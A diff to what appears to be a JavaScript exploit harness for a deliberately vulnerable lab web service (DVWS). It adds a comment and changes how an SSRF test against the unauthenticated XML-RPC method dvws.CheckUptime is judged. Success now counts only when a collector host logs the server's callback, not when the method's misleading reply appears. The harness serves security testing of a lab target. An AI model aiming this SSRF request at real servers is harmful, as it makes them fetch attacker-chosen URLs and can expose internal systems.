@@ -118,7 +118,9 @@ async function main() {
     }
   ));
 
-  // 2. Unauthenticated XML-RPC method fetches a caller-supplied URL.
+  // 2. Unauthenticated XML-RPC method fetches a caller-supplied URL. The effect
+  //    is the collector logging the callback, not the method's reply: the reply
+  //    says "Checking uptime for X" whether or not the fetch ever happened.
   results.push(await run(
     'ssrf_uptime',
     `POST /xmlrpc dvws.CheckUptime -> ${COLLECTOR_URL}`,
@@ -129,8 +131,12 @@ async function main() {
         body: xml,
         headers: { 'Content-Type': 'text/xml' },
       });
-      await new Promise((r) => setTimeout(r, 400));
-      return { response, landed: Boolean(response.status === 200 && /Checking uptime/.test(response.body)) };
+      const before = hits();
+      for (let i = 0; i < 20; i++) {
+        if (hits() > before) break;
+        await new Promise((r) => setTimeout(r, 150));
+      }
+      return { response, landed: hits() > before };
     }
   ));
 
